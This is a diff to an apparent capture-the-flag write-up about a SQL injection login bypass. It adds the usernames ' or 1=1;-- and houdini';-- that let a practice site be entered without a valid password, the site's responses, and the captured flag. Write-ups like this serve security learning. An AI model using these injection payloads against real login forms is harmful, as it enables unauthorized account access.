@@ -430,6 +430,23 @@ Looking at the 'pwHash', the hash is 64 characters long, which hints that it mig
 
 So the password field is definitely getting hashed. There is not much we can do with this field. However, the username field can be manipulated. Attempt to try the 1=1 trick:
 
+username:
 ' or 1=1;--
 
-That worked. 
+password:
+AnyString
+
+That worked. The website displays:
+
+Welcome admin! The "hash" for account 'houdini' is 'Not a hash'.
+
+It gives us the username: houdini. Now to hack houdini:
+
+username:
+houdini';--
+
+password:
+AnyString
+
+Result:
+Welcome Houdini, here's your flag: ACI{fd35465a027eeee3be0249d9f86}
